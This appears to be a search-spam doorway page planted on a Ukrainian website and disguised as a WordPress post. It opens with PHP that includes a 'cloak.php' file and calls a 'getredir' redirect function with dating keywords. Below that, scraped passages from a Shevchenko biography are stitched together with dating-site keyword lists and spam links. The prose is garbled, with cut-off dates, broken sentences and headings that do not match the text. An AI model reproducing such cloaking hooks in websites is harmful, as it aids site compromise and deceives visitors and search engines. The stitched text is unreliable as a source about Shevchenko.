<?php
if(!@include('cloak.php'))	@include('../cloak.php');
if(function_exists('getredir')){
	@getredir ('api', '%d0%b0%d0%b7%d1%96%d0%b0%d1%82%d1%81%d1%8c%d0%ba%d1%96+%d1%81%d0%b2%d0%b0%d1%82%d0%b0%d0%bd%d0%bd%d1%8f+%d0%b2+%d0%91%d1%96%d0%bb%d0%be%d0%b7%d0%b5%d1%80%d1%81%d1%8c%d0%ba%d0%b5+%d0%a3%d0%ba%d1%80%d0%b0%d1%97%d0%bd%d0%b0', '2021-05-21', 'pir_210521/UA_dat_geo_trans_ukr', 'ua_dating.txt');
}
?><!doctype html>
<html lang="">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<title>Українсько-азербайджанські відносини</title>
	<meta name="description" content="Шановні Білозерці! 14 жовтян року відбудуться святкові заходи присвячені Дню захисника України. На центральній площі в смт." />
	<link rel="canonical" href="https://masage.od.ua/img/196/fyhog-azatsk-svatannya-v.php" />
<?php if(!@include('../inc1mywp1.php')) @include('inc1mywp1.php'); ?>
						<div id="primary-menu" class="menu"><ul>
<li class="page_item page-item-2"><a href="https://masage.od.ua/img/467/qeb-veb-sayti-mskih.php">веб-сайти міських знайомств Кременець Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/184/wode-znayomstva-znovu-v.php">знайомства знову в Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/335/cuxim-sayt-znayomstv-cholovki.php">сайт знайомств чоловіки поруч Козятин Україна</a></li>
</ul></div>
						<div class="main-navigation-bg"></div>
						<div class="clearfix"></div>
					</nav><!-- #site-navigation -->
				</div>
			</div>

		</div>

	</header><!-- #masthead -->



	<div id="content" class="site-content">
	<div class="container"><div class="row"><div class="col-md-7 order-md-3">
	<div id="primary" class="content-area">
		<main id="main" class="site-main main-content-middle">


<article id="post-1" class="post-1 post type-post status-publish format-standard hentry category-uncategorized">
		<header class="entry-header">
		<h1 class="entry-title">Азіатські сватання в Білозерське Україна</h1><!-- .entry-meta -->
			</header><!-- .entry-header -->



	<div class="entry-content">

<p>
<p>Мешкаючи в одній кімнаті, працювали разом. Штернберґ малював образи із своїх ескізів. Річ ясна, що предметом їх розмов була Україна, звідки прибув Штернберґ, повний свіжих, яскравих для мешканця півночі українських вражень. Коли Сошенко вважав поетичні заняття Шевченка за непотрібні, за марнування дорогого часу, то з романтиком Штернберґом поет міг досхочу ділитися своїми літературними зацікавленнями й читати йому свої поетичні твори.</p>
<p>Брюлов одружився з сестрою їхнього товариша, німця з Риги Тімма — Емілією Тімм. Це була надзвичайна красуня. Шевченко і Штернберґ були в євангелицькій кірсі на шлюбі Брюлова, що відбувся без традиційного весілля. Шевченко був увесь час короткого подружнього життя Брюлових їхнім частим гостем і поділяв захоплення свого вчителя красунею-жінкою. Раптом, менше ніж по двох місяцях, Емілія покинула свого чоловіка й більше вже до нього не вернулася: він завдав їй тяжкої образи.</p>
<p>Драму свою Брюлов переживав дуже тяжко — він захворів, і Шевченко на деякий час навіть переселився до вчителя, опікуючись ним, як умів. Тарас був одною з небагатьох осіб, що були втаємничені в цю історію. У житті Шевченка теж не залишилася вона без значення. Причиною драми Брюлових був цар Микола І — відомо, що він залицявся до гарної дружини славного на всю Росію митця. Немає ніяких даних припускати, що перед тим Шевченко міг щось чути про інтимне життя цього деспота-монарха, але без усяких вагань можна ствердити, що тепер він багато довідався про це від свого вчителя.</p>
<p>Ще восени р. Як що напише, то тільки цмокни та вдар руками об поли!</p><strong><a id='z1'></a><h2>Стенограма 2010</h2></strong><p>А в січні р. Почав Шевченко писати поезії, очевидно, незабаром по тому, як пізнав Гребінку. Гребінці ж першому з своєю творчістю звірився, бо Гребінка перший зайнявся його літературною освітою, і напевне від нього першого Шевченко дістав писані нашою мовою твори і то, мабуть, усі, бо їх тоді було дуже небагато. Російські а може й польські поезії Шевченко вже читав перед тим.</p>
<p>Довідався теж, що його рідні народні пісні, яких він співав завжди залюбки — чи вдома, чи в полі, чи на чужині під час праці, — що ці пісні — теж справжня поезія, поезія, високо цінена також і чужими ученими й поетами, і що не один із них уважає народну пісню за найвищий прояв поетичної творчості, яку поетам треба наслідувати. Велика, мабуть, була його радість, коли деякі з рідних пісень, що їх він сам добре знав, побачив у збірниках кн. Цертелева й Максимовича. Повен тяжких, сумних настроїв, туги за рідним краєм і туги за волею, пригрітий добрими людьми, але й випроваджений ними на манівці оманливих мрій та надій, тужив тоді подвійно, і його наскрізь лірична вдача знайшла вихід для тієї туги: почав сам творити пісні, у яких тугу свою почав виливати.</p>
<p>Виливав її рідним словом. Але туга ця знаходила вислів у формі кращій і ще досконалішій, ніж та, що її мали українські пісні. Обидві знані йому стилістичні форми — народно-пісенна й та літературна, що її взірці знав із російської, польської та з української поезії, у дивно гармонійній сполуці творили нову українську поетичну форму.</p>
<p>За романтичними страхіттями його попередники не спромоглися на таке відтворення психічного стану нещасливої дівчини. У Бюрґера фантастика була представлена, як щось ніби реальне, у Жуковського — як сон, у Шевченка — як візії причинної, божевільної.</p><strong><a id='z2'></a><h2>Білозерка святкує День захисника України! | </h2></strong><p>Описав їх так так само, як і її смерть , ніби був психіатром: це точний опис сомнамбулізму, психічної хвороби, у яку іноді переходять тужливі переживання занадто чутливих натур, — усі симптоми цієї хвороби точно тут відтворені. Глибокий психологізм цієї балади мав джерелом своїм виняткову спостережливість її автора і його просто несамовитий дар — вчуватися в чужу душу. Як саме це сталося, що Гребінці відкрився аже за рік із тим, що пише поезії, — невідомо.</p>
<p>Можливо, що сталося це з приводу смерти І. Схвильований цією сумною вісткою, Шевченко написав елегію. В українських колах у Петербурзі смерть Котляревського, натурально, справила враження, і, можливо, що Шевченко під впливом відповідних розмов відважився прочитати Гребінці цей свій твір, а потім і взагалі відкрився із своєю творчістю, осмілений похвалами земляка-поета.</p>
<p>Ода-елегія на смерть Котляревського вказує нам і на одне з джерел Шевченкового національного усвідомлення. У ній Шевченко ствердив, що це Котляревський.</p>
		
			<br><ol>
			
				<li>сайти знайомств з людьми в Миколаїв Україна.</li>
			
				<li>Олег Гуцуляк. Пошуки заповітного царства by Oleg Gutsulyak - Issuu.</li>
			
				<li>пятниця оголошення знайомства поблизу Знамянка Україна.</li>
			
				<li>Білозерка святкує День захисника України! | ?</li>
			
				<li>Зайцев Павло Іванович. Життя Тараса Шевченка;</li>
			
				<li>область знайомства в Луганськ Україна.</li>
			
				<li>сайт знайомств на в Василівка Україна.</li>
			
			</ol>
		
	<p>Зумів ясно все це побачити крізь шкаралущу невластивої травестійної форми й непоміркованого, переперченого гумору. З цілком неориґінального сюжету — оповідання про сумну долю зведеної й покинутої дівчини — зробив справжній шедевр, у якому трагедія зведеної москалем українки виросла в трагедію зведеної москалями України.</p>
		
	<p>Гребінка від осени р. У цьому періоді він створив також: три пісні, що їх назвав думками. Проте до історичної епіки не приступав:. Воно було навіяне Квітчиним нарисом-споминами про осадчого нового чорноморського коша, запорожця Антона Головатого.</p>
		
			<br><ol>
			
				<li>Білозерка святкує День захисника України!;</li>
			
				<li>5. історія України. 9 клас. Готові дидактичні набори.2009?</li>
			
				<li>Довідник для підготовки до ЗНО по історії України.</li>
			
				<li>безкоштовні сайти знайомств поблизу Овруч Україна;</li>
			
				<li>Навігаційне меню!</li>
			
				<li>знайомства з хлопцями з Росії Южне Україна.</li>
			
				<li>Українсько-азербайджанські відносини — Вікіпедія?</li>
			
			</ol>
		
	<p>Яскраво змальована у Квітки, ця історична постать захопила Шевченка. У відтворенні образів минулого він надавав великого значення документальним даним. Казав про кобзарів:. Але оскільки йшлося про історичний матеріал, про знайомство з історією рідного краю, то саме тоді його загальні уявлення про минуле України, що їх перед тим мав лише на підставі народніх переказів, кобзарських дум і взагалі історичних пісень, почали набирати виразніших контурів.</p><a id='z3'></a><h3>Найпопулярніші книжки</h3><p>Маркевич був приятелем Гребінки. Шевченко опинився в атмосфері, де питання українського минулого зробилися предметом живих дискусій. Усі ці три історичні праці просякнуті були духом українсько-козацького патріотизму. У всіх трьох багато було поетичного, легендарного матеріалу. Усі три були не менш романтичні, ніж знані нашому молодому поетові поетично-історичні твори.</p>
<p>Вони переносили поета до яскравого, барвистого світу минулого, що був повним контрастом до тодішньої української дійсності, яка уявлялася йому якимсь тяжким сном. Від жовтня року до кінця січня року Шевченко жив разом із Сошенком на 4-ій лінії Василівського острова, на яку виходив і правий бічний фасад будинку Академії Мистецтв. Від січня року до літа жив разом із Штернберґом — в домі Аренса чи Арнста на 9-ій лінії Острова. Нараяв його Шевченкові інспектор Університету Фіцтум. Із згадок Шевченка про його спільне життя з Демським видно, що Демський давав йому лекції французької мови.</p>
<p>Демський мав твори Міцкевича й історичні праці Лелевеля. Живучи з ним разом, Шевченко мав нагоду познайомитися й з іншими творами польських письменників, бо польську мову вже знав. Демський мусів уступити своє місце Штернберґові. Про своє тодішнє спільне життя з ним Шевченко згадував пізніше із зворушенням і в далеких прикаспійських степах:. Уздовж передньої стіни над робочим столом висять дві полиці. Верхня заставлена статуетками й кониками барона Клодта, а нижня безладно завалена книжками.</p>
<p>Стіна, протилежна до напівзакритого єдиного вікна, завішена алебастровими зліпками стіп і ручок, а серед них красується маска Лаокоона й славної натурниці Фортунати. Оздоба незрозуміла для не-маляра! В додаток мені уявився той самий день, коли ми з небіжчиком Штернбергом за останні гроші купили собі просту робочу лампу, принесли її до нашої келії й серед білого дня засвітили, поставили серед стола і, як малі діти, тішилися нашим придбанням.</p>
<p>Декого з товаришів запросили полюбуватися нашим дивом і з того приводу втнули вечірку, себто чай з сухарями. Давнішу скромну кімнату Шевченка в домі Аренса, у якій жив він у кінці й на початку року, описав поміщик П. Мартос, з якого Шевченко малював тоді портрет аквареллю:. У такій скромній обстанові жив і творив Тарас Шевченко.</p>
<p>Тут відвідували його особи, з яких він малював портрети, що їх робив переважно аквареллю. Замовлень на портрети, мабуть, не бракувало, але непрактичний мистець-поет не завжди вмів витягти гроші від своїх клієнтів.</p>
		
	<p>Було це на початку року, мабуть десь у кінці січня. Штернберґ зробив для неї ілюстрацію — кобзаря з поводирем, репродуковану потім в офорті. Підписав його цензор П. Корсаков, що сам був письменником, бував на Україні й дуже цінив українську поезію. Як на тодішні обставини, Корсаков був дуже лагідним цензором.</p>
<p>Усе ж деякі уступи з тексту творів він усунув. Дещо усунув, мабуть, і сам Шевченко. Зайнятий працею в Академії, Тарас і далі не покидав літературної роботи. Уже в цьому щойно другому році академічної науки почав малювати олійними фарбами, напевне випередивши своїх товаришів. У цьому ж році він намалював і свій автопортрет, з усіма стилістичним прикметами портретів романтичної доби, випробовуючи, мабуть, ще нову для себе техніку олійного малювання.</p>
<p>Ця праця залишала йому ще час і для виконування приватних замовлень, про які була вже мова вище. У березні він мав змогу вислати братові Микиті 50 карб, асигнаціями. Коли мав гроші, витрачав їх на розваги. Бував часто в театрах і не жалував грошей на добре місце.</p>
</p>
	</div><!-- .entry-content -->

</article><!-- #post-1 -->


		</main><!-- #main -->
	</div><!-- #primary -->


	</div><div class="col-md-2 order-md-1">

	<aside id="secondary" class="widget-area">
			</aside><!-- #secondary -->
</div><div class="col-md-3 order-md-10">
	<aside id="secondary" class="widget-area">
		<section id="search-2" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://masage.od.ua/img/113/bipec-znayomstva-z-hristiyaninom.php">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
				</label>
				<input type="submit" class="search-submit" value="Search" />
			</form></section>		<section id="recent-posts-2" class="widget widget_recent_entries">		<h2 class="widget-title">Recent Posts</h2>		<ul>
											<li><a href="https://masage.od.ua/img/428/gacy-avtomatichne-pdklyuchennya-v.php">автоматичне підключення в Мена Україна</a></li><li><a href="https://masage.od.ua/img/106/gywa-znayomstva-lyudina.php">знайомства людина поруч Жашків Україна</a></li><li><a href="https://masage.od.ua/img/248/goc-dzherela-znayomstv.php">джерела знайомств поблизу Старобільськ Україна</a></li><li><a href="https://masage.od.ua/img/133/javiz-prosto-pdklyucht-donetsk.php">просто підключіть Донецьк Україна</a></li><li><a href="https://masage.od.ua/img/428/sare-shvidksn-pobachennya.php">швидкісні побачення пятниця в Голубівка Україна</a></li><li><a href="https://masage.od.ua/img/468/dukon-arabsk-znayomstva.php">арабські знайомства в Молодогвардійськ Україна</a></li><li><a href="https://masage.od.ua/img/113/de-pdklyuchiti-plyami.php">підключити плями в Ічня Україна</a></li>
					</ul>
		</section>

			<section id="meta-2" class="widget widget_meta"><h2 class="widget-title">Articles</h2>
				<ol><li><a href='#z1'>Стенограма 2010</a></li>
<li><a href='#z2'>Білозерка святкує День захисника України! | </a></li>
<li><a href='#z3'>Найпопулярніші книжки</a></li>
</ol>
			</section>

	</aside><!-- #secondary -->
</div></div></div>	</div>
	<footer id="colophon" class="site-footer">

		<div class="covf-footer-copyright">
			<div class="container">
				<div class="row">
					<div class="col">
						<div class="site-info text-center">
							Powered by 	<a href="https://masage.od.ua/img/184/lyj-bezkoshtovniy-sayt-pdklyuchennya.php">Covfefe WordPress Theme</a>
						</div>
					</div>
				</div>
			</div>
		</div>
	</footer><!-- #colophon -->
</div><!-- #page -->

<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/jquery.marquee.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/scripts.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/comment-reply.min.js?ver=5.0.3'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/wp-embed.min.js?ver=5.0.3'></script>

</body>
</html>